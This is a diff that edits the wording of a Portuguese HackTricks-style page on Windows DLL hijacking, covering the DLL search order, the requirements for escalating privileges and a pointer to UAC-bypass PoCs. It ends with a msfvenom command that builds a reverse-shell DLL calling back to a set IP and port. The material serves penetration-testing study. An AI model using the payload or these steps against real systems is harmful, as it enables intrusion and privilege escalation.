@@ -2,8 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-
-
 ## Basic Information
 
 DLL Hijacking envolve manipular um aplicativo confiável para carregar um DLL malicioso. Este termo abrange várias táticas como **DLL Spoofing, Injection, e Side-Loading**. É utilizado principalmente para execução de código, alcançando persistência e, menos comumente, escalonamento de privilégios. Apesar do foco no escalonamento aqui, o método de hijacking permanece consistente entre os objetivos.
@@ -49,12 +47,11 @@ Você pode ver a **ordem de busca de DLL em sistemas de 32 bits** abaixo:
 1. O diretório de onde o aplicativo foi carregado.
 2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho deste diretório.(_C:\Windows\System32_)
 3. O diretório do sistema de 16 bits. Não há função que obtenha o caminho deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
-4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório.
-1. (_C:\Windows_)
+4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório. (_C:\Windows_)
 5. O diretório atual.
 6. Os diretórios listados na variável de ambiente PATH. Note que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca de DLL.
 
-Essa é a **ordem de busca padrão** com **SafeDllSearchMode** habilitado. Quando desabilitado, o diretório atual sobe para o segundo lugar. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina como 0 (o padrão é habilitado).
+Essa é a **ordem de busca padrão** com **SafeDllSearchMode** habilitado. Quando desabilitado, o diretório atual sobe para o segundo lugar. Para desativar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).
 
 Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.
 
@@ -68,17 +65,17 @@ Certas exceções à ordem padrão de busca de DLL são notadas na documentaçã
 
 - Quando um **DLL que compartilha seu nome com um já carregado na memória** é encontrado, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação de redirecionamento e um manifesto antes de recorrer ao DLL já na memória. **Nesse cenário, o sistema não realiza uma busca pelo DLL**.
 - Em casos onde o DLL é reconhecido como um **DLL conhecido** para a versão atual do Windows, o sistema utilizará sua versão do DLL conhecido, juntamente com quaisquer de seus DLLs dependentes, **abrindo mão do processo de busca**. A chave de registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista desses DLLs conhecidos.
-- Se um **DLL tiver dependências**, a busca por esses DLLs dependentes é realizada como se fossem indicados apenas pelos seus **nomes de módulo**, independentemente de o DLL inicial ter sido identificado através de um caminho completo.
+- Se um **DLL tiver dependências**, a busca por esses DLLs dependentes é realizada como se fossem indicados apenas por seus **nomes de módulo**, independentemente de o DLL inicial ter sido identificado através de um caminho completo.
 
 ### Escalating Privileges
 
 **Requisitos**:
 
 - Identificar um processo que opera ou operará sob **diferentes privilégios** (movimento horizontal ou lateral), que está **faltando um DLL**.
-- Garantir que o **acesso de escrita** esteja disponível para qualquer **diretório** no qual o **DLL** será **pesquisado**. Este local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.
+- Garantir que o **acesso de gravação** esteja disponível para qualquer **diretório** no qual o **DLL** será **pesquisado**. Este local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.
 
-Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando um dll** e é ainda **mais estranho ter permissões de escrita em uma pasta de caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
-No caso de você ter sorte e se encontrar atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá um **PoC** de um Dll hijacking para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de escrita).
+Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando um dll** e é ainda **mais estranho ter permissões de gravação em uma pasta de caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
+No caso de você ter sorte e se encontrar atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá um **PoC** de um Dll hijacking para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de gravação).
 
 Note que você pode **verificar suas permissões em uma pasta** fazendo:
 ```bash
@@ -107,7 +104,7 @@ Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilida
 
 ### Exemplo
 
-Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar um dll que exporte pelo menos todas as funções que o executável importará dele**. De qualquer forma, note que o Dll Hijacking é útil para [escalar do nível de Integridade Média para Alta **(bypassando UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**Alta Integridade para SYSTEM**](#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar um dll válido** dentro deste estudo de dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar um dll que exporte pelo menos todas as funções que o executável importará dele**. De qualquer forma, note que o Dll Hijacking é útil para [escalar do nível de Integridade Médio para Alto **(bypass UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**Alta Integridade para SYSTEM**](#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar um dll válido** dentro deste estudo de dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
 Além disso, na **próxima seção** você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **modelos** ou para criar um **dll com funções não requeridas exportadas**.
 
 ## **Criando e compilando Dlls**
@@ -120,7 +117,7 @@ Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLira
 
 ### **Meterpreter**
 
-**Get rev shell (x64):**
+**Obter rev shell (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
